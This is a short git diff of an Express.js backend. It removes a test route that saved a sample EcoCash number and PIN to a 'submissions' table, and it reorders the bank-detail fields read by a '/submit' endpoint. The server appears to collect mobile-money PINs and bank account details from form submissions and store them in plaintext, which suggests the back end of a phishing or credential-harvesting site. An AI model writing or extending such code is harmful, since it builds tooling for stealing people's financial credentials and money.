@@ -69,18 +69,6 @@ app.get("/create-table", async (req, res) => {
   }
 });
 
-app.get("/save-test", async (req, res) => {
-  try {
-    await pool.query(
-      "INSERT INTO submissions (ecocash_number, ecocash_pin) VALUES ($1,$2)",
-      ["0771234567", "TEST123"]
-    );
-
-    res.send("Test data saved");
-  } catch (err) {
-    res.status(500).json({ error: err.message });
-  }
-});
 app.get("/create-bank-table", async (req, res) => {
   try {
     await pool.query(`
@@ -108,8 +96,8 @@ app.post("/submit", async (req, res) => {
     const {
       bank_name,
       account_number,
-      branch_code,
-      phone_number
+      phone_number,
+      branch_code
     } = req.body;
 
     await pool.query(
